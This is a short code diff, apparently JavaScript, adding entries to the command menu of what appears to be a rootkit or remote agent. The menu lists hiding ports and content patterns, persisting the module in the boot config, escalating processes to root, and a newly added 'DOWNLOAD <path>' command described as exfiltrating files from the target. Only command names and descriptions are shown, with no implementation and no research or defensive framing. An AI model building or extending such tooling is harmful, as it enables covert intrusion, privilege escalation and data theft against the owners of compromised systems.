@@ -21,6 +21,8 @@ const COMMANDS = [
   { cmd: 'LIST PORT', desc: 'List hidden ports' },
   { cmd: 'LIST CONTENT', desc: 'List hidden content patterns' },
   { cmd: 'PERSIST', desc: 'Write module to boot config' },
+  { cmd: 'UNPERSIST', desc: 'Remove module from boot config' },
+  { cmd: 'DOWNLOAD <path>', desc: 'Exfiltrate file from target' },
   { cmd: 'ESCALATE <pid>', desc: 'Elevate process to root' },
   { cmd: 'QUIT', desc: 'Disconnect agent' },
 ]
